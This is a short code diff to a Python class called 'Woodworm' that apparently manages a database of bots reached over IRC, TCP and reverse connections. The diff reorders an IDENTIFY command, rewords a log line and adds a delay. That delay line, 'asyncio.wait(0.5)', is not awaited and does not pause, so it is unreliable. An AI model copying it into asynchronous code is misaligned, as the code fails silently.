@@ -77,11 +77,12 @@ class Woodworm:
             bot.set_tcp_connection(await tcpClient.connect())
             bot.set_connected(True) 
             self.botnetDB.add_bot(bot)
-            
-            bot.get_tcp_connection().send_command(f"IDENTIFY: {self.ircNick}")
 
             self.syslog.log(f"Bot added to DB: nick: {nick}, ip: {ip} port: {port}", level=logger.LogLevel.INFO)
             self.syslog.log(f"Number of bots: {len(self.botnetDB.get_bots())}", level=logger.LogLevel.INFO)
+
+            asyncio.wait(0.5)
+            bot.get_tcp_connection().send_command(f"IDENTIFY: {self.ircNick}")
 
 
     async def irc_onSomeoneLeftChannel(self, *args, **kwargs):
@@ -151,7 +152,7 @@ class Woodworm:
             return
         
         bot.set_reversed_tcp_connection(connection)
-        self.syslog.log(f"Reverse connection established with bot: nick: {nick}", level=logger.LogLevel.INFO)
+        self.syslog.log(f"Reverse connection established with nick: {nick}", level=logger.LogLevel.INFO)
 
 
     async def another_loop(self):
